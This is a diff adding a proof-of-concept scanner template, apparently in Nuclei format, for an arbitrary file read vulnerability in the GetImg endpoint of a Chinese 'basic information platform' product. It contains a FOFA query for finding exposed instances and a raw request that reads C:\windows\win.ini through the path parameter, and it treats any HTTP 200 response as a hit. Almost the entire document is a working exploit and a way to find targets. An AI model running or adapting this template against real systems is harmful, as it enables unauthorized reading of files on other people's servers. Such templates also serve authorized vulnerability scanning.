@@ -1,0 +1,25 @@
+id: poc-myakgeepum374wtn
+info:
+  name: 地大信息-基础信息平台 GetImg 任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/myakgeepum374wtn'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: myakgeepum374wtn
+    fofa: body="/SystemManage/BaseProject" || title=="基础信息平台"
+http:
+- raw:
+  - 'GET /SystemManage/BaseProject/GetImg?path=C:\windows\win.ini HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
